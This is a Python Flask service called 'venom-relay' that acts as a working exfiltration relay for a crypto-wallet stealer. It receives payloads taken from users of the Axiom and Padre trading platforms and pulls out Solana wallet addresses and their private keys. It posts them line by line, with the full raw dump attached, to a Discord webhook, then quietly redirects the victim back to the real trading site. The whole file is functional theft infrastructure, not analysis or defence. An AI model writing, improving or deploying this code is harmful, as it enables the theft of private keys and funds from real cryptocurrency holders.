# venom-relay — Render Web Service (Python / Flask)
# env vars : DISCORD_WEBHOOK (obligatoire), SECRET (optionnel)
# route    : GET /?data=<base64url>&key=<secret>  |  POST /  (json brut)

import os
import base64
import json
import time

from dotenv import load_dotenv
load_dotenv()

from flask import Flask, request, Response
import requests


app = Flask(__name__)

WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
SECRET  = os.environ.get("SECRET", "")

if not WEBHOOK:
    raise SystemExit("DISCORD_WEBHOOK missing")

PLATFORM_REDIRECTS = {
    "axiom": "https://axiom.trade/",
    "padre": "https://trade.padre.gg/",
}

ALLOWED_HOSTS = ("axiom.trade", "padre.gg")

MAX_CONTENT = 1900   # Discord caps content at 2000


def decode_b64url(s: str) -> str:
    b64 = s.replace("-", "+").replace("_", "/")
    b64 += "=" * (-len(b64) % 4)
    return base64.b64decode(b64).decode("utf-8")


def redirect_target(parsed: dict) -> str:
    host = (parsed.get("host") or "").lower()
    platform = (parsed.get("platform") or "").lower()
    for allowed in ALLOWED_HOSTS:
        if host == allowed or host.endswith("." + allowed):
            return f"https://{host}/"
    return PLATFORM_REDIRECTS.get(platform, "https://axiom.trade/")


def done_page(parsed: dict) -> str:
    target = json.dumps(redirect_target(parsed))
    return (
        "<!doctype html><meta charset=utf-8><title>ok</title>"
        "<body style='background:#050a06;color:#4ade80;font:14px system-ui;"
        "display:grid;place-items:center;height:100vh;margin:0'>done</body>"
        "<script>location.replace(" + target + ")</script>"
    )


def normalize_wallets(parsed: dict) -> list:
    platform = (parsed.get("platform") or "").lower()
    wallets = parsed.get("wallets") or []
    keys = parsed.get("keys") or []
    addresses = parsed.get("addresses") or []

    if wallets:
        return wallets

    n = max(len(keys), len(addresses))
    if n == 0:
        return []

    default_chain = "SOL" if platform == "padre" else "?"
    stubs = []
    for i in range(n):
        addr = addresses[i] if i < len(addresses) else ""
        stubs.append([addr, default_chain, "", "", "", "", ""])
    return stubs


def build_content(parsed: dict) -> str:
    """One line per Solana wallet: address : private key : label : wal N."""
    host    = parsed.get("host", "?")
    keys    = parsed.get("keys", []) or []
    wallets = normalize_wallets(parsed)

    lines = [f"**{host}**"]
    n = 0
    for i, w in enumerate(wallets):
        if not isinstance(w, (list, tuple)) or len(w) < 2:
            continue
        chain = (w[1] or "").upper()
        if chain != "SOL":
            continue
        addr  = w[0] or ""
        label = (w[5] if len(w) > 5 else "") or "—"
        key   = keys[i] if i < len(keys) else "not recovered"
        n += 1
        lines.append(
            f"`Adresse Solana :` {addr} : `Private Key :` {key} : `Label :` {label} : `Wal {n}`"
        )

    if n == 0:
        lines.append("`no SOL wallet recovered`")

    body = "\n".join(lines)
    if len(body) > MAX_CONTENT:
        body = body[: MAX_CONTENT - 1] + "…"
    return body


def forward(parsed: dict, payload: str) -> Response:
    files = {
        "files[0]": (
            f"suite-logs-{int(time.time()*1000)}.json",
            payload.encode("utf-8"),
            "application/json",
        )
    }
    data = {
        "payload_json": json.dumps({
            "content": build_content(parsed),
            "username": "Suite Logs",
            "attachments": [{"id": "0", "filename": f"suite-logs.json"}],
        }),
    }

    try:
        r = requests.post(WEBHOOK, data=data, files=files, timeout=15)
    except requests.RequestException as e:
        return Response(f"fetch failed: {e}", status=500)

    if not r.ok:
        return Response(
            f"discord {r.status_code} {r.text[:300]}",
            status=502,
            mimetype="text/plain",
        )

    return Response(done_page(parsed), mimetype="text/html")


@app.get("/")
def root():
    raw = request.args.get("data")
    if not raw:
        return Response("ok", mimetype="text/plain")

    if SECRET and request.args.get("key") != SECRET:
        return Response("forbidden", status=403, mimetype="text/plain")

    try:
        payload = decode_b64url(raw)
        parsed = json.loads(payload)
    except Exception as e:
        return Response(f"bad payload: {e}", status=400, mimetype="text/plain")

    return forward(parsed, payload)


@app.post("/")
def post_root():
    if SECRET and request.args.get("key") != SECRET:
        return Response("forbidden", status=403, mimetype="text/plain")

    payload = request.get_data(as_text=True) or ""
    try:
        parsed = json.loads(payload)
    except Exception:
        return Response("bad json", status=400, mimetype="text/plain")

    return forward(parsed, payload)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
